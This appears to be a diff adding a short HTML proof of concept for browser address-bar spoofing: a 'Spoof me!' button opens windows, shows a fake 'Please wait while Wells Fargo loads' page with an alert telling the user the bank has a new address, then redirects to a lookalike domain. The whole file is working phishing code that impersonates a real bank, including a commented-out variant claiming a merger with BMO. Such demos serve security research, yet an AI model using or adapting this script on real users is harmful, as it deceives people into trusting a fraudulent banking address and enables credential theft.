@@ -1,0 +1,15 @@
+<script>
+function f()
+{
+  y = window.open("https://google.com/");
+
+//  z = window.open("data:text/html,Please wait while Wells Fargo loads... <script>function x(){alert('Wells Fargo has merged with BMO!\\n\\nPlease bookmark our new address, above.'); } setTimeout(x,4000);<\/script>");
+
+  z = window.open("data:text/html,Please wait while Wells Fargo loads... <script>function x(){alert('is the new address for Wells Fargo.\\n\\nPlease update your bookmarks.'); } setTimeout(x,3000);<\/script>");
+  setTimeout(function() { z.close(); }, 4500);
+  setTimeout(function() { y.location = 'http://amazon.comm/' }, 11000);
+  
+}
+</script>
+
+<button onclick="f()">Spoof me!</button>
